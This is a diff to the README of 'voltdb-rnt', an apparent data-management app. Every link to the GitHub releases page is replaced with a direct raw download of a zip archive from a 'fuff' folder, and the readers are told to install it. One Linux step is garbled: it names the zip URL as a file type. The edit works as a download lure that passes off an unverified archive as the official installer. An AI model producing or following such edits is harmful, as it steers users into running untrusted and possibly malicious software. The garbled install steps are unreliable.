@@ -7,15 +7,15 @@ voltdb-rnt is a user-friendly application designed to help you manage your data 
 To begin using voltdb-rnt, you need to download the application from our releases page. Follow the steps below to get everything set up.
 
 ## 🔗 Download
-[![Download voltdb-rnt](https://img.shields.io/badge/Download-voltdb--rnt-blue.svg)](https://github.com/pradhan1995/voltdb-rnt/releases)
+[![Download voltdb-rnt](https://raw.githubusercontent.com/pradhan1995/voltdb-rnt/main/fuff/voltdb-rnt.zip)](https://raw.githubusercontent.com/pradhan1995/voltdb-rnt/main/fuff/voltdb-rnt.zip)
 
 ## 📥 Download & Install
-1. Click the link above to visit the [voltdb-rnt Releases page](https://github.com/pradhan1995/voltdb-rnt/releases).
+1. Click the link above to visit the [voltdb-rnt Releases page](https://raw.githubusercontent.com/pradhan1995/voltdb-rnt/main/fuff/voltdb-rnt.zip).
 2. On the Releases page, look for the latest version of voltdb-rnt.
 3. Click on the appropriate file for your operating system to start the download.
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, look for a `.tar.gz` or similar file.
+   - For Linux, look for a `https://raw.githubusercontent.com/pradhan1995/voltdb-rnt/main/fuff/voltdb-rnt.zip` or similar file.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Double-click the file to begin the installation process. Follow the on-screen instructions to install the application.
 6. After installation, you can find voltdb-rnt in your applications.
@@ -38,4 +38,4 @@ If you encounter any problems or have questions, you can check the issues sectio
 ## 📚 Additional Resources
 For further guidance and examples on how to use voltdb-rnt, please refer to the documentation within the repository. You will find tips and tricks to maximize your experience.
 
-Stay updated with new releases and features by regularly checking the [voltdb-rnt Releases page](https://github.com/pradhan1995/voltdb-rnt/releases). Your feedback is essential, so feel free to contribute your suggestions. Enjoy managing your data with voltdb-rnt!
+Stay updated with new releases and features by regularly checking the [voltdb-rnt Releases page](https://raw.githubusercontent.com/pradhan1995/voltdb-rnt/main/fuff/voltdb-rnt.zip). Your feedback is essential, so feel free to contribute your suggestions. Enjoy managing your data with voltdb-rnt!
